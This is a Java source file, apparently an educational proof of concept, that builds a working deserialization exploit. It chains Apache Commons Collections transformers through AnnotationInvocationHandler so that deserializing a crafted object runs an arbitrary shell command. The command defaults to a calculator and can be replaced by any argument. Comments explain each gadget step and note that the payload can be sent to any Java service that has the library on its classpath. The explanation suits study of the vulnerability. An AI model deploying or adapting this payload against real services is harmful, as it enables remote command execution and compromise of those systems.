package net.tmclean.test.vul_serialize;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

/*
 * The purpose of this project is to clearly outline the details for the arbitrary remote command
 * execution through Java object deserialization. This method uses vulnerable code in AnnotationInvocationHandler
 * and the Commons Collections library to trigger the execution of Runtime.getRuntime().exec( command ) where command
 * is an arbitrary shell command to be executed external to the JVM. 
 * 
 * Outlines the 
 * 
 * Inspired by the work at:
 * 		https://github.com/frohoff/ysoserial
 * 		http://frohoff.github.io/appseccali-marshalling-pickles/
 * 		http://www.ibm.com/developerworks/library/se-lookahead/
 */
public class App 
{
	/*
	 * Deserializing this class causes a walk through the entries of a map
	 */
	private static final String INVOCATION_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
	
    public static void main( String[] args ) throws Throwable
    {
    	String cmd = "/usr/bin/gnome-calculator";
    
    	if( args.length > 0 )
    	{
    		cmd = args[0];
    	}
    	
    	//
    	// Generate the map that will cause the resolution and invocation of 
    	// Runtime.getRuntime().exec( "...." ).
    	//
    	Map<String,Object> evilMap = generateEvilMapForCommand( cmd );
    	
    	//
    	// Create a new instance of AnnotationInvocationHandler that uses the evil
    	// map. On deserialization this class with walk through the entries of the
    	// given map, which triggers the command execution.
    	//
    	Object attackObject = buildAttackObject( evilMap );
    	
    	//
    	// Serialize our attack object for transport
    	//
    	byte[] attackPayload = serializeAttackObject( attackObject );
    	
    	//
    	// Everything that occurs after this line may as well be on another machine.
    	// I could write this out to a file and then read in the byte array, but just
    	// passing the serialized byte array is sufficient to demonstrate a remote attack.
    	//
    	
    	//
    	// Deserialize the byte array into and object.
    	//
    	Object reconstitutedAttackObject = deserializeAttackPayload( attackPayload );
    	
    	//
    	// Print our shiny new clone of the attack object to the console.
    	//
    	System.out.println( reconstitutedAttackObject );
    }
    
    /*
     * Here we generate our evil map from features included with commons-collection.
     */
    private static Map<String, Object> generateEvilMapForCommand( String cmd ) throws Throwable
    {
    	//
    	// First build a new, normal hash map. The contents of this map do not matter,
    	// but it needs to be a String->String mapping for the purposes of this example.
    	// Later in the process we will be hijacking the AnnotationInvocationHandler, which will 
    	// map the types values to the results of methods in a given annotation. The annotation 
    	// we will be using is the SuppressWarnings, which accepts one or more strings. Thus, in
    	// this example we will be setting the "value" property of SuppressWarnings to "value".
    	//
    	Map<String, Object> goodMap = new HashMap<>();
    	goodMap.put( "value", "value" );

    	// Build the evil transformer chain.
    	ChainedTransformer transformerChain = buildTransformerForCommand( cmd );
    	
    	// Wrap the good hash map with the evil transformer chain
		@SuppressWarnings("unchecked")
		Map<String,Object> evilMap = TransformedMap.decorate( goodMap, null, transformerChain );
		
    	return evilMap;
    }
    
    private static ChainedTransformer buildTransformerForCommand( String cmd )
    {
    	Transformer transformers[] = new Transformer[]{
    			
    			//
    			// First resolve the runtime class and return it.
    			//
        		new ConstantTransformer( Runtime.class ),
        		
        		//
        		// Runtime.class will be passed up the chain where we will call getMethod( "getRuntime" ) on it
        		//
        		new InvokerTransformer( "getMethod", new Class[]{ String.class, Class[].class }, new Object[]{ "getRuntime", new Class[0] } ),
        		
        		//
        		// The method handle for Runtime.getRuntime() will get passed up and we will invoke it, we now have a 
        		// reference to the Runtime object
        		//
        		new InvokerTransformer( "invoke", new Class[]{ Object.class, Object[].class }, new Object[]{ null, new Object[0] } ),
        		
        		//
        		// The Runtime object gets bubbled up and we finally call "exec" on it using our evil command.
        		//
        		new InvokerTransformer( "exec", new Class[]{ String.class }, new Object[]{ cmd } )
        		
        		//
        		// The net result of this chain is the invocation of the following statement:
        		// 		
        		//		Runtime.getRuntime().exec( "evil thing to do..." )
        		//
        };

    	//
    	// Bundle up the transformer array into a ChainedTransformer, which will 
    	// handle the various layers of execution outlined above.
    	//
    	return new ChainedTransformer( transformers );
    }
    
    private static Object buildAttackObject( Map<String,Object> evilMap ) throws Throwable
    {
    	//
    	// Generate an instance of the AnnotationInvocationHandler class using the SupressWarnings annotation
    	// and the evil map with the the evil transformation chain.
    	//
    	Class<?> annInvClass = Class.forName( INVOCATION_HANDLER_CLASS );
    	Constructor<?> cons = annInvClass.getDeclaredConstructor( Class.class, Map.class );
    	cons.setAccessible( true );
    	return cons.newInstance( SuppressWarnings.class, evilMap );
    }
    
    /*
     * Standard object serialization, nothing special here
     */
    private static byte[] serializeAttackObject( Object obj ) throws Throwable
    {
    	ByteArrayOutputStream bos = new ByteArrayOutputStream();
    	ObjectOutputStream oos = new ObjectOutputStream( bos );
    	oos.writeObject( obj );
    	return bos.toByteArray();
    }

    /*
     * Standard object deserialization, nothing special here. >.>
     */
    private static Object deserializeAttackPayload( byte[] attackPayload ) throws Throwable
    {
    	//
    	// Actually, something special does happen here. The deserialization routines will use
    	// our evil map to proxy the "value" field in SupressWarnings. In order to do this it will
    	// iterate over each Entry in the evil map and in doing so trigger our evil transformation
    	// chain which contains our evil command.
    	//
    	// Everything from the object hierarchy to the command to be executed is serializable
    	// and can be sent over the wire to any Java service that contains the Apache Commons Collections
    	// library. Even if the library is not being utilized, if it is present in the classpath, 
    	// the service is vulnerable.
    	//
    	
    	ByteArrayInputStream bin = new ByteArrayInputStream( attackPayload );
    	ObjectInputStream ois = new ObjectInputStream( bin );
    	return ois.readObject();
    }
}
